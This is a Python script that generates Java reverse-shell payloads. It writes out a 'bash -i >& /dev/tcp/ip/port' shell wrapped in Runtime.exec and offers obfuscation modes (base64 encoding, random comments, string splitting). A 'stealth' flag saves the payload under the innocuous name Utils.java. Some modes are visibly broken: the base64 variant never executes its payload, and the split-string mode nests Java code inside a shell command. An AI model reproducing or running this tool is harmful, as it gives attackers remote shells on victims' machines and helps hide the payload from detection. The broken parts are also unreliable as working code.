import os
import random
import string
import base64

def random_comment_java():
    return "// " + ''.join(random.choices(string.ascii_letters, k=10))

def split_string_java(s, chunk=15):
    parts = [s[i:i+chunk] for i in range(0, len(s), chunk)]
    var_names = [''.join(random.choices(string.ascii_lowercase, k=4)) for _ in parts]
    code = ""
    for var, part in zip(var_names, parts):
        code += f"String {var} = \"{part}\";\n"
    concat = ' + '.join(var_names)
    code += f"String cmd = {concat};\n"
    # Evaluate using Runtime.exec? But we need to execute the code, so we'll wrap the whole thing.
    code += "try { Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",cmd}); } catch(Exception e){}"
    return code

def generate_manual(ip, port, obfuscation="0", stealth=False):
    # Java reverse shell (simplified, using /bin/sh)
    payload = f"Runtime.getRuntime().exec(new String[]{{\"/bin/sh\",\"-c\",\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"}});"
    
    if obfuscation == "0":
        final = f"public class Rev {{ public static void main(String[] args) throws Exception {{ {payload} }} }}"
    elif obfuscation == "1":  # Base64 (the class file would need decoding, but for source we do base64 of the whole class)
        # We'll simulate: encode the payload string
        encoded = base64.b64encode(payload.encode()).decode()
        final = f"public class Rev {{ public static void main(String[] args) throws Exception {{ String b=\"{encoded}\"; new String(new sun.misc.BASE64Decoder().decodeBuffer(b)); }} }}"
        # This is not fully working but for demo; better to use a simpler approach: eval? Java doesn't have eval.
        # Alternatively we just output the payload as a command that decodes and compiles.
    elif obfuscation == "4":  # SUPER: random comments + string splitting
        comments = '\n'.join([random_comment_java() for _ in range(3)])
        split_code = split_string_java(payload)
        final = f"public class Rev {{\n    {comments}\n    public static void main(String[] args) throws Exception {{\n        {split_code}\n    }}\n}}"
    else:
        final = f"public class Rev {{ public static void main(String[] args) throws Exception {{ {payload} }} }}"

    os.makedirs("output", exist_ok=True)
    filename = "Rev.java"
    if stealth:
        filename = "Utils.java"
    with open(os.path.join("output", filename), "w") as f:
        f.write(final)
    print(f"[+] Java payload saved to output/{filename}")